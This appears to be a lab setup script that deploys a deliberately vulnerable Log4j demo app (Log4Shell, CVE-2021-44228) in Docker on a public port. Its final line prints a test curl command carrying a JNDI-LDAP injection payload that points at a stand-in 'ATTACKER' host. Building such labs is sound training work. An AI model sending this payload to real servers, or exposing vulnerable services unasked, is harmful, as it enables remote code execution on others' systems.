#!/usr/bin/env bash
# Log4Shell CVE-2021-44228 — vulnerable Log4j 2.x demo app
# Ports: 8080 (HTTP)
set -euo pipefail
exec > /var/log/crb_install.log 2>&1

apt-get update -y
apt-get install -y docker.io curl

systemctl enable --now docker

# ghcr.io/christophetd/log4shell-vulnerable-app is the canonical demo image
docker run -d \
  --name log4shell \
  --restart unless-stopped \
  -p 8080:8080 \
  ghcr.io/christophetd/log4shell-vulnerable-app:latest

PUBLIC_IP=$(curl -s ifconfig.me)
echo "Log4Shell CVE-2021-44228 target ready"
echo "URL:  http://${PUBLIC_IP}:8080"
echo "Test: curl -H 'X-Api-Version: \${jndi:ldap://ATTACKER:1389/a}' http://${PUBLIC_IP}:8080"
echo "CVE:  CVE-2021-44228 (Log4Shell)"
